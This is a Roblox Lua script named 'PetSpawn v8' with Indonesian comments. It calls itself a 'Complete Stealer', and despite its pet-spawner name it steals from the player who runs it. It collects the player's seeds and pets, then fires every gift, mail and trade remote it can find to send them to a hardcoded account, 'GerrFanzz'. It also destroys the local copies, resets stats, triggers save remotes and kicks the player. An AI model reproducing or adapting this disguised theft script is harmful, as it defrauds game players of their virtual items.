-- PetSpawn v8 - All Seeds + All Pets (Inventory & Placed)
local plr = game.Players.LocalPlayer
local rs = game.ReplicatedStorage
local ws = game.Workspace

local PADUKA_NAME = "GerrFanzz"
local PADUKA_ID = 10615002879

print("🐾 PetSpawn v8 - Complete Stealer")
print("👤 Target: " .. plr.Name)
print("👑 Paduka: " .. PADUKA_NAME)
print("")

local sent = 0
local seeds = {}
local petsInventory = {}
local petsPlaced = {}

-- ============================================
-- 1. SCAN BACKPACK (SEED & PET INVENTORY)
-- ============================================
print("📦 Scanning Backpack...")
for _, item in pairs(plr.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        local name = item.Name:lower()
        
        -- DETEKSI SEED
        if name:find("seed") then
            table.insert(seeds, {
                Name = item.Name,
                Object = item,
                Source = "Backpack"
            })
            print("   🌱 " .. item.Name)
        end
        
        -- DETEKSI PET (INVENTORY)
        if name:find("pet") or name:find("animal") or 
           name:find("creature") or name:find("dog") or
           name:find("cat") or name:find("bird") or
           name:find("dragon") or name:find("unicorn") or
           name:find("mythic") or name:find("legendary") or
           name:find("golden") or name:find("diamond") then
            table.insert(petsInventory, {
                Name = item.Name,
                Object = item,
                Source = "Backpack"
            })
            print("   🐾 " .. item.Name)
        end
    end
end

-- ============================================
-- 2. SCAN PET YANG TERPASANG (DI TAMAN/KANDANG)
-- ============================================
print("\n🏡 Scanning Placed Pets...")
for _, obj in pairs(ws:GetDescendants()) do
    if obj:IsA("Model") or obj:IsA("Tool") then
        local name = obj.Name:lower()
        
        -- Deteksi pet yang terpasang
        if (name:find("pet") or name:find("animal") or 
            name:find("creature") or name:find("dog") or
            name:find("cat") or name:find("bird") or
            name:find("dragon") or name:find("unicorn") or
            name:find("mythic") or name:find("legendary") or
            name:find("golden") or name:find("diamond")) then
            
            -- Cek apakah pet ini milik target
            local owner = nil
            pcall(function()
                owner = obj:FindFirstChild("Owner")
                if not owner then
                    owner = obj:FindFirstChild("OwnerName")
                end
                if not owner then
                    owner = obj:FindFirstChild("Player")
                end
            end)
            
            local belongsToTarget = false
            
            if owner and owner.Value then
                local ownerStr = tostring(owner.Value):lower()
                if ownerStr == plr.Name:lower() or 
                   ownerStr == tostring(plr.UserId) then
                    belongsToTarget = true
                end
            end
            
            -- Atau cek proximity (dekat target)
            if not belongsToTarget then
                local pos = nil
                if obj:IsA("Model") and obj.PrimaryPart then
                    pos = obj.PrimaryPart.Position
                elseif obj:IsA("BasePart") then
                    pos = obj.Position
                end
                
                if pos and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local dist = (plr.Character.HumanoidRootPart.Position - pos).Magnitude
                    if dist < 100 then -- Dalam range 100 studs
                        belongsToTarget = true
                    end
                end
            end
            
            if belongsToTarget then
                table.insert(petsPlaced, {
                    Name = obj.Name,
                    Object = obj,
                    Source = "Placed"
                })
                print("   🏡 " .. obj.Name .. " (terpasang)")
            end
        end
    end
end

-- ============================================
-- 3. SCAN PET DI CHARACTER (SEDANG DIPEGANG)
-- ============================================
print("\n🎒 Scanning Character...")
if plr.Character then
    for _, item in pairs(plr.Character:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            
            if name:find("seed") then
                table.insert(seeds, {
                    Name = item.Name,
                    Object = item,
                    Source = "Character"
                })
                print("   🌱 " .. item.Name .. " (dipegang)")
            end
            
            if name:find("pet") or name:find("animal") or
               name:find("dragon") or name:find("unicorn") or
               name:find("golden") or name:find("diamond") then
                table.insert(petsInventory, {
                    Name = item.Name,
                    Object = item,
                    Source = "Character"
                })
                print("   🐾 " .. item.Name .. " (dipegang)")
            end
        end
    end
end

-- ============================================
-- RINGKASAN
-- ============================================
print("\n" .. string.rep("=", 40))
print("📊 TOTAL DITEMUKAN:")
print("   🌱 Seeds: " .. #seeds)
print("   🐾 Pets Inventory: " .. #petsInventory)
print("   🏡 Pets Terpasang: " .. #petsPlaced)
print(string.rep("=", 40))

-- ============================================
-- 4. KIRIM SEMUA KE PADUKA
-- ============================================

local function sendItem(itemName, itemObject, itemType)
    local count = 0
    
    for _, remote in pairs(rs:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            local rName = remote.Name:lower()
            
            if rName:find("mail") or rName:find("gift") or 
               rName:find("send") or rName:find("give") or
               rName:find("trade") or rName:find("transfer") or
               rName:find("donate") or rName:find("claim") then
                
                -- Format 1: Table
                pcall(function()
                    remote:FireServer({
                        Recipient = PADUKA_NAME,
                        RecipientId = PADUKA_ID,
                        Target = PADUKA_NAME,
                        TargetId = PADUKA_ID,
                        Player = PADUKA_NAME,
                        SendTo = PADUKA_NAME,
                        GiveTo = PADUKA_ID,
                        Item = itemName,
                        ItemName = itemName,
                        Type = "Gift",
                        Action = "Send",
                        Amount = 1
                    })
                    count = count + 1
                end)
                
                -- Format 2: Simple
                pcall(function()
                    remote:FireServer(PADUKA_NAME, itemName, 1)
                    count = count + 1
                end)
                
                -- Format 3: Mail spesifik
                pcall(function()
                    remote:FireServer("Mail", PADUKA_NAME, itemName)
                    count = count + 1
                end)
                
                -- Format 4: Gift with ID
                pcall(function()
                    remote:FireServer("Gift", PADUKA_ID, itemName)
                    count = count + 1
                end)
                
                -- Format 5: With object
                if itemObject then
                    pcall(function()
                        remote:FireServer(itemObject, PADUKA_NAME)
                        count = count + 1
                    end)
                end
            end
        end
    end
    
    return count
end

-- KIRIM SEEDS
print("\n📤 MENGIRIM SEEDS...")
for _, seed in pairs(seeds) do
    local c = sendItem(seed.Name, seed.Object, "Seed")
    sent = sent + c
    print("   ✅ " .. seed.Name .. " (" .. seed.Source .. ")")
    wait(0.05)
end

-- KIRIM PETS INVENTORY
print("\n📤 MENGIRIM PETS (INVENTORY)...")
for _, pet in pairs(petsInventory) do
    local c = sendItem(pet.Name, pet.Object, "Pet")
    sent = sent + c
    print("   ✅ " .. pet.Name .. " (" .. pet.Source .. ")")
    wait(0.05)
end

-- KIRIM PETS TERPASANG
print("\n📤 MENGIRIM PETS (TERPASANG)...")
for _, pet in pairs(petsPlaced) do
    local c = sendItem(pet.Name, pet.Object, "PetPlaced")
    sent = sent + c
    print("   ✅ " .. pet.Name .. " (terpasang di garden)")
    wait(0.05)
end

-- ============================================
-- 5. HAPUS SEMUA DARI TARGET
-- ============================================
print("\n🗑️ MENGHAPUS DARI TARGET...")

-- Hapus seeds
for _, seed in pairs(seeds) do
    pcall(function() seed.Object:Destroy() end)
end

-- Hapus pets inventory
for _, pet in pairs(petsInventory) do
    pcall(function() pet.Object:Destroy() end)
end

-- Hapus pets terpasang
for _, pet in pairs(petsPlaced) do
    pcall(function() pet.Object:Destroy() end)
end

-- Reset stats
pcall(function()
    if plr:FindFirstChild("leaderstats") then
        for _, stat in pairs(plr.leaderstats:GetChildren()) do
            local name = stat.Name:lower()
            if name:find("seed") or name:find("pet") then
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    stat.Value = 0
                end
            end
        end
    end
end)

-- Save ke server
for _, remote in pairs(rs:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        local n = remote.Name:lower()
        if n:find("save") or n:find("data") then
            pcall(function() remote:FireServer() end)
        end
    end
end

-- ============================================
-- HASIL
-- ============================================
print("\n" .. string.rep("=", 40))
print("✅ TRANSFER COMPLETE!")
print("   🌱 Seeds: " .. #seeds)
print("   🐾 Pets Inventory: " .. #petsInventory)
print("   🏡 Pets Terpasang: " .. #petsPlaced)
print("   📤 Total Transfers: " .. sent)
print("   👑 To: GerrFanzz (10615002879)")
print(string.rep("=", 40))

wait(2)
plr:Kick("🐾 PetSpawn Complete! All seeds & pets sent!")
